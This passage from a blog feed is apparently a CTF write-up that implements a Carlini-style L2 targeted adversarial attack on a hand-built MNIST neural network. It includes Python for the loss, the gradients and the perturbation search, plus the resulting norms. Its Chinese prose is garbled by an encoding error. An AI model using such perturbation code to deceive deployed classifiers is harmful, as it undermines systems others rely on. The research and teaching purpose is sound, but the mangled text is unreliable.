class="number">512</span>, <span class="number">256</span>, <span class="number">10</span>]</span><br><span class="line">    myNN = ANN(uNum)</span><br><span class="line">    myNN.LOAD(<span class="string">&quot;weight.dat&quot;</span>)</span><br><span class="line">    data = pd.read_csv(<span class="string">r&#x27;picData.csv&#x27;</span>)</span><br><span class="line">    x = np.matrix(data.iloc[:, <span class="number">1</span>:])</span><br><span class="line">    mask = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        print(<span class="string">&quot;&gt;&gt; Mask &quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot; :&quot;</span>)</span><br><span class="line">        maskTemp = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">784</span>):</span><br><span class="line">            maskTemp.append(<span class="built_in">float</span>(<span class="built_in">input</span>()))</span><br><span class="line">        mask.append(np.array(maskTemp, dtype=np.float64).ravel())</span><br><span class="line">    mask = np.matrix(mask)</span><br><span class="line">    CHECK(mask, myNN, x)</span><br></pre></td></tr></table></figure>    </div></div><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><h3 id="Loss"><a href="#Loss" class="headerlink" title="Loss"></a>Loss</h3><p>å‚è€ƒè®ºæ–‡ï¼Œåœ¨<code>Loss</code>ä¸­åŒ…å«äº†å¯¹L2çš„æƒ©ç½šé¡¹ï¼Œæˆ‘implementçš„æ—¶å€™ä½¿ç”¨çš„æ˜¯ç±»ä¼¼äºå‚æ•°æ­£åˆ™åŒ–ä¸€æ ·çš„æ–¹æ³•ï¼Œç®€å•ä½†æœ‰æ•ˆï¼Œåœ¨æ¯æ¬¡è¿­ä»£åï¼šæ ¹æ®å¯¹L2çš„é™åˆ¶ï¼Œè®©æœ€ç»ˆçš„å™ªå£°<code>Pert</code>è‡ªå‡ä¸€ç‚¹ç‚¹</p><p>è€Œå¯¹äºå¦‚ä½•åœ¨<code>Loss</code>ä¸­ä½“ç°å‡ºé€¼è¿‘Targetï¼Œç›´æ¥å€Ÿé‰´ä¸€ä¸‹Carliniå¤§ç¥çš„ç»“è®ºï¼Œå³å‚è€ƒæ–‡çŒ®ä¸­çš„<code>f6</code>ï¼Œæ¯•ç«Ÿè¿™äº›ä¸œè¥¿å°±æ˜¯å‡­ç»éªŒå‡­æ„Ÿè§‰å¼„å‡ºæ¥çš„ï¼Œä»–ä»¬åŸºæœ¬ä¹Ÿå°±æ˜¯é€‰äº†ä¸€äº›è‡ªå·±è§‰å¾—æœ‰å¯èƒ½å¯è¡Œçš„<code>Loss</code>ç„¶åå…¨éƒ¨è·‘ä¸€éï¼Œæ‰¾ä¸€ä¸ªæ•ˆæœæœ€å¥½çš„</p><img src="/images/L2TarAtt_f6.png" width=350><p>å…¶ä¸­åŠ å·ä¸Šæ ‡è¡¨ç¤ºå¯¹æ‹¬å·å†…çš„å‚æ•°<code>x</code>æ‰§è¡Œ<code>max(x, 0)</code></p><p>å¤§æ¦‚æ„ä¼šä¸€ä¸‹ï¼Œé¦–å…ˆè¿™ç©æ„å„¿å¾—ä»<code>logits</code>å±‚å¼€å§‹å›å½’ï¼Œç„¶åè‡³äºä»–è¿™ä¸ª<code>Loss</code>çš„æ€æƒ³ä¹Ÿå°±å­—é¢æ„æ€ï¼šæ‰“å‹å½“å‰æ¦‚ç‡æœ€é«˜çš„ï¼Œè¿›è€Œæ‰¶æŒtargetçš„æ¦‚ç‡ï¼ˆåŠ«å¯Œæµè´«å±äºæ˜¯</p><p>æˆ‘æ²¡æœ‰å®Œå…¨æŒ‰ç…§ä»–çš„<code>loss</code>æ¥ï¼ˆä¸»è¦æ˜¯ä¸ºäº†æ–¹ä¾¿ï¼‰ï¼Œä½†æ˜¯æ€æƒ³éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘implementçš„å°±æ˜¯ä¸€ä¸ªå¯¹æ— å…³é¡¹ç½®é›¶çš„äº¤å‰ç†µï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d_crossEntPert</span>(<span class="params">self</span>):</span></span><br><span class="line">    mat = np.matrix(self.A[-<span class="number">1</span>] - self.y)</span><br><span class="line">    <span class="keyword">if</span> np.argmax(np.array(self.y).ravel()) != np.argmax(np.array(self.A[-<span class="number">1</span>]).ravel()):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">if</span> i != np.argmax(np.array(self.y).ravel()) <span class="keyword">and</span> i != np.argmax(np.array(self.A[-<span class="number">1</span>]).ravel()):</span><br><span class="line">                mat[<span class="number">0</span>, i] = <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> mat</span><br></pre></td></tr></table></figure><p>æ³¨1ï¼šæ­¤å¤„çš„<code>Loss</code>è¿˜å¹¶éæœ€ç»ˆå½¢æ€ï¼Œå› ä¸ºæ²¡æœ‰åŠ å…¥å¯¹<code>Pert</code>çš„æƒ©ç½šé¡¹</p><p>æ³¨2ï¼šå…³äºä¸ºä»€ä¹ˆè¦åœ¨æœ€ç»ˆlabelæ˜¯targetçš„æƒ…å†µä¸‹ç›´æ¥returnï¼Œåˆ™æ˜¯å› ä¸ºè¿™æ ·åœ¨å·²ç»æ‰¾åˆ°å±äºtargetçš„å†³ç­–åŒºåŸŸåçš„ä¸‹é™é€Ÿåº¦æ›´å¿«ï¼Œè¿˜å¯ä»¥é˜²æ­¢æ¢¯åº¦æ¶ˆå¤±</p><h3 id="Get-Gradient"><a href="#Get-Gradient" class="headerlink" title="Get Gradient"></a>Get Gradient</h3><p>ç”±äºæ˜¯è‡ªå·±æ“çš„FCNNï¼Œè·å–æ¢¯åº¦ç›´æ¥<code>backProp</code>å°±è¡Œäº†ï¼Œæ¯”å¦‚æƒ³è¦å€’æ•°ç¬¬äºŒå±‚çš„dZï¼Œ<code>backProp</code>ä¹‹åå°±ç›´æ¥<code>FCNN.dZ[-2]</code>ï¼Œéå¸¸æ–¹ä¾¿ï¼Œè¿™ä¸ªæ‰‹æ“<code>BP</code>çš„æ¢¯åº¦ä¹Ÿæ‹¿å»å’Œ<code>tensorflow</code>ä¸­çš„<code>gradientTape</code>æ±‚å‡ºçš„æ¢¯åº¦åšäº†å¯¹æ¯”ï¼Œä¿è¯æ¢¯åº¦æ­£ç¡®</p><p>ç®€åŒ–å‰”é™¤äº†ä¸€äº›å¸¸è§„<code>BP</code>åœ¨æ­¤æƒ…å¢ƒä¸‹ä¸éœ€è¦çš„å†…å®¹ï¼Œå¾—åˆ°ä»¥ä¸‹ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backProp</span>(<span class="params">self, d_lossFunc</span>):</span></span><br><span class="line">    self.dZ[-<span class="number">1</span>] = d_lossFunc()</span><br><span class="line">    dw = self.A[-<span class="number">2</span>].T * self.dZ[-<span class="number">1</span>]</span><br><span class="line">    db = np.<span class="built_in">sum</span>(self.dZ[-<span class="number">1</span>], axis=<span class="number">0</span>)</span><br><span class="line">    self.dw[-<span class="number">1</span>] = np.r_[db, dw]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="number">1</span>, self.layerNum - <span class="number">1</span>)):</span><br><span class="line">        self.dA[i] = RemoveBias(self.dZ[i + <span class="number">1</span>] * self.w[i + <span class="number">1</span>].T)</span><br><span class="line">        self.dZ[i] = np.multiply(d_relu(self.Z[i]), self.dA[i])</span><br><span class="line">        dw = self.A[i - <span class="number">1</span>].T * self.dZ[i]</span><br><span class="line">        db = np.<span class="built_in">sum</span>(self.dZ[i], axis=<span class="number">0</span>)</span><br><span class="line">        self.dw[i] = np.r_[db, dw]</span><br><span class="line">self.dA[<span class="number">0</span>] = RemoveBias(self.dZ[<span class="number">1</span>] * self.w[<span class="number">1</span>].T)</span><br><span class="line">self.dZ[<span class="number">0</span>] = self.dA[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h3 id="Fool"><a href="#Fool" class="headerlink" title="Fool"></a>Fool</h3><p>ç°åœ¨å…³é”®æˆåˆ†éƒ½å·²ç»é½å…¨äº†ï¼Œå°±å¯ä»¥å¼€å§‹ç”ŸæˆAdversarialPerturbationäº†</p><p>åŸºæœ¬çš„è¿­ä»£è¿‡ç¨‹å¤§è‡´å¦‚ä¸‹ï¼š</p><ul><li>æŠŠtargetè®¾ç½®æˆ<code>y</code>ï¼Œå› ä¸º<code>loss</code>å‡½æ•°ä¸­ä¼šç”¨åˆ°ï¼ˆæ¯”å¦‚è¦æŠŠ<code>6</code>ç³Šå¼„æˆ<code>7</code>ï¼Œåˆ™<code>target=7</code>ï¼‰</li><li>ForwardProp()</li><li>åˆ¤æ–­targetçš„confidenceæ˜¯å¦ç¬¦åˆè¦æ±‚ï¼Œç¬¦åˆåˆ™returnï¼Œä¸ç¬¦åˆåˆ™ç»§ç»­</li><li>BackProp()</li><li>å¯¹æ¢¯åº¦åŠ å…¥å…³äº<code>Pert</code>çš„æƒ©ç½šé¡¹</li></ul><p>åœ¨æ­¤åŸºç¡€ä¸Šï¼Œè¿˜è¿›è¡Œäº†å‡ ç‚¹ä¼˜åŒ–ï¼š</p><ul><li>å› ä¸ºè¿™ä¸ªæ–¹æ³•è‚‰çœ¼å¯è§çš„å®¹æ˜“å‡ºç°æƒ©ç½šé¡¹ä¸é€¼è¿‘Targetçš„æ–¹å‘ç›¸åçš„æƒ…å†µï¼Œæ‰€ä»¥åŠ å…¥äº†ä¸€ä¸ªåœ¨Stuckæ—¶è¿›è¡Œéšæœºæ‰°åŠ¨çš„åŠŸèƒ½</li><li>å¯¹èµ·ç‚¹è¿›è¡Œæ¯”è¾ƒå°çš„éšæœºæ‰°åŠ¨ï¼Œç¨å¾®å·®å¼‚åŒ–æ¯æ¬¡ä¸‹é™è¿‡ç¨‹</li></ul><p>ï¼ˆåœ¨è¾“å‡ºä¸­åŠ emojiä¸»è¦æ˜¯ä¸ºäº†å¿«é€Ÿæµè§ˆè¿è¡Œç»“æœï¼Œè€Œä¸”äº‹å®è¯æ˜Jupyterå¯¹æ­¤æ”¯æŒæ˜¯æ²¡é—®é¢˜çš„ï¼Œçœ‹ç€å¾ˆé…¥ç³Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fool</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, myNetwork</span>):</span></span><br><span class="line">        self.Network = myNetwork</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetGrad</span>(<span class="params">self, X</span>):</span></span><br><span class="line">        pred = self.Network.predict(X)</span><br><span class="line">        self.Network.backProp(self.Network.d_crossEntPert)</span><br><span class="line">        <span class="keyword">return</span> self.Network.dA[<span class="number">0</span>], pred.ravel()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Fool</span>(<span class="params">self, X, y, tar, foolRate=<span class="number">0.5</span>, maxIter=<span class="number">500</span>, step=<span class="number">0.05</span>, minGrad=<span class="number">0.05</span>, maxGrad=<span class="number">10</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             constrain=<span class="number">10</span>, stuckRandL2=<span class="number">1</span>, initRandL2=<span class="number">1</span></span>):</span></span><br><span class="line">        rand = np.matrix(np.random.randn(<span class="number">1</span>, <span class="number">784</span>))</span><br><span class="line">        pert = np.zeros((<span class="number">1</span>, <span class="number">784</span>)) + initRandL2 * rand / np.linalg.norm(rand)</span><br><span class="line">        loss = []</span><br><span class="line">        L2Rec = []</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        stuckCnt = <span class="number">0</span></span><br><span class="line">        stuckJudgeCnt = <span class="number">0</span></span><br><span class="line">        success = <span class="literal">False</span></span><br><span class="line">        self.Network.predict(X + pert)</span><br><span class="line">        print(<span class="string">&quot;init: &quot;</span> + <span class="built_in">str</span>(y) + <span class="string">&quot; prob: &quot;</span> +</span><br><span class="line">              <span class="built_in">str</span>(self.Network.A[-<span class="number">1</span>].ravel()[y]))</span><br><span class="line">        self.Network.y = OneHot(</span><br><span class="line">            <span class="number">1</span>, self.Network.unitNum[-<span class="number">1</span>], y) <span class="keyword">if</span> tar == -<span class="number">1</span> <span class="keyword">else</span> OneHot(<span class="number">1</span>, self.Network.unitNum[-<span class="number">1</span>], tar)</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">            print(<span class="string">&quot;\rcnt: &quot;</span> + <span class="built_in">str</span>(cnt) + <span class="string">&quot;  stuck: &quot;</span> + <span class="built_in">str</span>(stuckCnt), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            grad, pred = self.GetGrad(X + pert)</span><br><span class="line">            loss.append(np.linalg.norm(self.Network.A[-<span class="number">1</span>]) <span class="keyword">if</span> tar == -<span class="number">1</span> <span class="keyword">else</span></span><br><span class="line">                        -np.<span class="built_in">sum</span>(np.array(self.Network.y) * np.log(self.Network.A[-<span class="number">1</span>])</span><br><span class="line">                        + np.array(<span class="number">1</span> - self.Network.y) * np.log(<span class="number">1</span> - self.Network.A[-<span class="number">1</span>])))</span><br><span class="line">            <span class="keyword">if</span> ((self.Network.A[-<span class="number">1</span>].ravel()[y] &lt; foolRate <span class="keyword">if</span> tar == -<span class="number">1</span> <span class="keyword">else</span> self.Network.A[-<span class="number">1</span>].ravel()[tar] &gt; foolRate)</span><br><span class="line">                    <span class="keyword">and</span> stuckJudgeCnt &gt; <span class="number">5</span>):</span><br><span class="line">                print(<span class="string">&quot;\nâ­• OK:      &quot;</span> + <span class="built_in">str</span>(np.argmax(pred)) + <span class="string">&quot;    &quot;</span> +</span><br><span class="line">                      <span class="built_in">str</span>(self.Network.A[-<span class="number">1</span>].ravel()[np.argmax(pred)]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                success = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> np.linalg.norm(pert):</span><br><span class="line">                para = <span class="built_in">max</span>((np.linalg.norm(pert) - constrain) ** <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">                grad -= np.<span class="built_in">sum</span>(np.array(pert) * np.array(grad)) * \</span><br><span class="line">                    (pert / np.linalg.norm(pert)) * para</span><br><span class="line">            L2 = np.linalg.norm(grad)</span><br><span class="line">            L2Rec.append(np.array(L2).ravel())</span><br><span class="line">            <span class="keyword">if</span> L2 &gt; maxGrad:</span><br><span class="line">                grad *= maxGrad / L2</span><br><span class="line">            <span class="keyword">if</span> L2 &lt; minGrad:</span><br><span class="line">                <span class="keyword">if</span> L2 == <span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">&quot;\nERR: grad is zero&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                grad *= minGrad / L2</span><br><span class="line">            pert -= grad * step</span><br><span class="line">            cnt += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> cnt == maxIter - <span class="number">1</span>:</span><br><span class="line">                print(<span class="string">&quot;\nâŒ nope:   &quot;</span> + <span class="built_in">str</span>(y <span class="keyword">if</span> tar == -<span class="number">1</span> <span class="keyword">else</span> tar) + <span class="string">&quot;      &quot;</span> +</span><br><span class="line">                      <span class="built_in">str</span>(self.Network.A[-<span class="number">1</span>].ravel()[y <span class="keyword">if</span> tar == -<span class="number">1</span> <span class="keyword">else</span> tar]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> cnt &gt; <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">abs</span>(loss[-<span class="number">1</span>] - loss[-<span class="number">2</span>]) &lt; <span class="number">0.1</span>:</span><br><span class="line">                stuckJudgeCnt += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> stuckJudgeCnt &gt; <span class="number">10</span>:</span><br><span class="line">                    rand = np.matrix(np.random.randn(</span><br><span class="line">                        pert.shape[<span class="number">0</span>], pert.shape[<span class="number">1</span>]))</span><br><span class="line">                    pert += rand / np.linalg.norm(rand) * stuckRandL2</span><br><span class="line">                    stuckJudgeCnt = <span class="number">0</span></span><br><span class="line">                    stuckCnt += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> success, pert, loss, L2Rec</span><br></pre></td></tr></table></figure><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p>äºæ˜¯æˆ‘ä»¬åªéœ€è¦åŸºäºä»¥ä¸Šçš„åŸºç¡€å†å¯¹æ¯ä¸ªæ•°å­—è®¡ç®—ä¸€éå³å¯</p><p>è€ƒè™‘åˆ°è¦ä½¿å¾—L2å°½å¯èƒ½å°ï¼Œæˆ‘ä½¿ç”¨åŠ¨æ€çš„Constrainï¼Œä½¿å¾—æœç´¢ç»“æœçš„L2å¿«é€Ÿå‡å°åˆ°ä¸€ä¸ªå¯è§‚çš„èŒƒå›´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> KyNetExp</span><br><span class="line">X = np.matrix(pd.read_csv(<span class="string">r&#x27;picData.csv&#x27;</span>).iloc[:, <span class="number">1</span>:])</span><br><span class="line">unitNum = [<span class="number">784</span>, <span class="number">512</span>, <span class="number">256</span>, <span class="number">10</span>]</span><br><span class="line">FCNN = KyNetExp.Network()</span><br><span class="line">FCNN.Init(unitNum)</span><br><span class="line">FCNN.LoadParameters(<span class="string">&quot;weight.dat&quot;</span>)</span><br><span class="line">Fool = KyNetExp.Fool(FCNN)</span><br><span class="line">pert = []</span><br><span class="line">deltaConstrain = <span class="number">0.1</span></span><br><span class="line">maxUnsuccessCnt = <span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    print(<span class="string">&quot;\n-------------------- &quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot; --------------------\n&quot;</span>)</span><br><span class="line">    bestPert = np.matrix(np.ones((<span class="number">1</span>,<span class="number">784</span>)) * np.inf)</span><br><span class="line">    constrain = <span class="number">30</span></span><br><span class="line">    UnsuccessCnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(UnsuccessCnt &lt; maxUnsuccessCnt):</span><br><span class="line">        success = <span class="literal">False</span></span><br><span class="line">        success, pert_i, loss, L2Rec = Fool.Fool(X[i], i+<span class="number">1</span>, i+<span class="number">2</span>, maxIter=<span class="number">500</span>, foolRate=<span class="number">0.8</span>,</span><br><span class="line">                                                 constrain=constrain, stuckRandL2=<span class="number">1</span>, initRandL2=<span class="number">1</span>,</span><br><span class="line">                                                 minGrad=<span class="number">0.001</span>)</span><br><span class="line">        <span class="keyword">if</span> success:</span><br><span class="line">            <span class="keyword">if</span> np.linalg.norm(pert_i) &lt; np.linalg.norm(bestPert):</span><br><span class="line">                constrain = <span class="built_in">min</span>(np.linalg.norm(pert_i) - deltaConstrain, constrain)</span><br><span class="line">                bestPert = pert_i</span><br><span class="line">                UnsuccessCnt = <span class="number">0</span></span><br><span class="line">                print(<span class="string">&quot;----------------------------------&quot;</span>)</span><br><span class="line">                print(<span class="string">&quot;# New Constrain: &quot;</span> + <span class="built_in">str</span>(constrain))</span><br><span class="line">                print(<span class="string">&quot;----------------------------------\n&quot;</span>)</span><br><span class="line">            constrain -= deltaConstrain / <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            UnsuccessCnt += <span class="number">1</span></span><br><span class="line">    pert.append(bestPert)</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆç”Ÿæˆçš„Pertæ•°æ®å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># L2</span></span><br><span class="line">np.linalg.norm(np.array([np.array(i).ravel() <span class="keyword">for</span> i <span class="keyword">in</span> pert]), axis=<span class="number">1</span>)</span><br><span class="line">&gt;&gt; array([<span class="number">4.09481434</span>, <span class="number">4.2946097</span> , <span class="number">6.64396102</span>, <span class="number">5.90332629</span>, <span class="number">6.05583615</span>,</span><br><span class="line">       <span class="number">5.71162228</span>, <span class="number">6.26226203</span>, <span class="number">3.06447416</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡å€¼</span></span><br><span class="line">np.<span class="built_in">sum</span>(np.linalg.norm(np.array([np.array(i).ravel() <span class="keyword">for</span> i <span class="keyword">in</span> pert]), axis=<span class="number">1</span>)) / <span class="number">8</span></span><br><span class="line">&gt;&gt; <span class="number">5.2538632468131485</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Linf</span></span><br><span class="line">np.linalg.norm(np.array([np.array(i).ravel() <span class="keyword">for</span> i <span class="keyword">in</span> pert]), <span class="built_in">ord</span>=np.inf, axis=<span class="number">1</span>)</span><br><span class="line">&gt;&gt; array([<span class="number">0.51915417</span>, <span class="number">0.6969855</span> , <span class="number">0.94458608</span>, <span class="number">0.8020708</span> , <span class="number">0.99483219</span>,</span><br><span class="line">       <span class="number">0.70698208</span>, <span class="number">1.12368025</span>, <span class="number">0.41853863</span>])</span><br></pre></td></tr></table></figure><p>å®è§‚æ„Ÿå—å¦‚ä¸‹</p><img src="/images/L2TarAtt_Attacked.png"><p>å¯¹æ¯”Carliniçš„è®ºæ–‡ä¸­çš„L2æ•°æ®ï¼Œæˆ‘è®¤ä¸ºè¿™æ ·çš„ç»“æœå‹‰å¼ºå¯ä»¥æ¥å—ï¼Œä½†é‰´äºè§†è§‰æ•ˆæœä»ç„¶ä¸ä½³ï¼Œä¹‹åå¯èƒ½ä¼šè€ƒè™‘åœ¨æ›´å¤§è§„æ¨¡çš„modelå’Œdatasetä¸Šåšadversarial attackæ–¹é¢çš„ç§ç§å®éªŒ</p><h2 id="DumbAss"><a href="#DumbAss" class="headerlink" title="DumbAss"></a>DumbAss</h2><p>ä¸€å¼€å§‹è¿˜æƒ³ç€é å•çº¯çš„æ¢¯åº¦ä¸‹é™ç›´æ¥ï¼Œç¡¬ç€æé«˜targetçš„è‡ªä¿¡åº¦ï¼Œä½†æ˜¯å¯¼è‡´çš„é—®é¢˜å°±æ˜¯å„ç§æ¢¯åº¦æ¶ˆå¤±æ¢¯åº¦è¿‡ç¼“ä¹‹ç±»çš„ï¼Œæ¯”å¦‚æˆ‘å½“æ—¶çš„<code>loss</code>æ˜¯è¿™æ ·ä¸‹é™çš„</p><img src="/images/L2TarAtt_fig.png"><p>å…·ä½“æ˜¯æŠŠ<code>6</code>è¯†åˆ«æˆ<code>7</code>çš„æƒ…æ™¯ï¼ŒèŒƒæ•°å¦‚ä¸‹ï¼ŒåƒåŠ›ä¸è®¨å¥½äº†å±äºæ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">L2  : <span class="number">8.161735079209715</span></span><br><span class="line">Linf: <span class="number">1.188402119264267</span></span><br></pre></td></tr></table></figure><p>åœ¨åšè¿™ä¸ªL2 Targeted Attackçš„æ—¶å€™ï¼Œæœ€å¤šçš„æ—¶é—´åº”è¯¥æ˜¯æµªè´¹åœ¨ä»¥ä¸‹è¿™å‡ ä»¶äº‹ä¸Šï¼š</p><ul><li><code>float64</code>ä¸<code>float32</code>åœ¨åŠ è½½ä¸å‚¨å­˜çš„æ—¶å€™æ²¡æœ‰æ³¨æ„ç±»å‹ï¼Œå¯¼è‡´ä¸èƒ½åŠæ—¶ä¸<code>tensorFlow</code>å¯¹ç­”æ¡ˆ</li><li><code>softMax</code>åå¯¼çš„å‡½æ•°é”™è¯¯ï¼Œå¯¼è‡´æœ€ç»ˆåå¯¼é”™è¯¯</li><li>æ–‡çŒ®æŸ¥æ‰¾ï¼Œæ‰¾åˆ°Carliniçš„è¿™ç¯‡æ–‡ç« èŠ±äº†æŒºå¤šæ—¶é—´çš„</li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;ç»ˆäºæ˜¯æŠŠè¿™ç©æ„å„¿è‡ªå·±å®ç°äº†ä¸€éï¼Œæ°é€¢miniL CTFï¼Œè¿™æ–‡ç« è™½ç„¶æ˜¯22.04.09å†™çš„ï¼Œä½†æ˜¯ä¼°è®¡åšå®¢å¾—ç­‰åˆ°äº”æœˆå¤šæ‰ä¼šæ›´æ–°ï¼Œå±Šæ—¶å°†ä¹Ÿå†è¡¥å……ä¸€äº›åœ¨miniL CTFä¸­æœ¬é¢˜çš„æƒ…å†µ&lt;/p&gt;</summary>
    
    
    
    <category term="AI" scheme="https://kyriota.github.io/categories/AI/"/>
    
    
    <category term="CTF" scheme="https://kyriota.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>HandleCrack</title>
    <link href="https://kyriota.github.io/2022/03/23/HandleCrack/"/>
    <id>https://kyriota.github.io/2022/03/23/HandleCrack/</id>
    <published>2022-03-23T10:00:00.000Z</published>
    <updated>2022-08-02T06:50:31.957Z</updated>
    
